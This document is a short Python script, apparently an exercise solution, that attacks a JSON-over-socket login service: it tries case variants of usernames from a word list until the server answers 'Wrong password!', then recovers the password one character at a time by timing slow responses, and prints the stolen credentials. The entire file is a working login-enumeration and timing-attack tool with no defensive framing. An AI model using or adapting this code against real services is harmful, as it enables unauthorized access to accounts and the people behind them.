import sys
import socket
import string
import os
import time
import json
from itertools import product


def get_login():
    path = os.path.join(os.getcwd(), 'logins.txt')
    with open(path, 'r') as f:
        for line in f:
            yield line.strip()


def find_login():
    raw = get_login()
    while True:
        lower = next(raw).lower()
        upper = lower.upper()
        gen = product(*zip(upper, lower))
        while True:
            try:
                login = ''.join(next(gen))
                yield login
            except StopIteration:
                break


def gen_pwd_letter():
    pass_char = string.ascii_letters.lower() + string.ascii_letters.upper() + string.digits
    for char in pass_char:
        yield char


def hacker():
    address, port = sys.argv[1:]
    check_login = find_login()
    true_key = {}
    with socket.socket() as client:
        client.connect((address, int(port)))
        while True:
            login = next(check_login)
            pair = json.dumps({'login': login, 'password': ""})
            client.send(pair.encode())
            res = client.recv(1024).decode()
            if json.loads(res)['result'] == 'Wrong password!':
                true_key['login'] = login
                break

        pass_char = gen_pwd_letter()
        true_pass = ''
        while True:
            pwd = true_pass + next(pass_char)
            pair = json.dumps({'login': login, 'password': pwd})
            client.send(pair.encode())
            t1 = time.perf_counter()
            res = client.recv(1024).decode()
            t2 = time.perf_counter()
            if t2 - t1 > 0.1:
                true_pass = pwd
                pass_char = gen_pwd_letter()
                continue
            if json.loads(res)['result'] == 'Connection success!':
                true_key['password'] = pwd
                break

        print(json.dumps(true_key))


hacker()
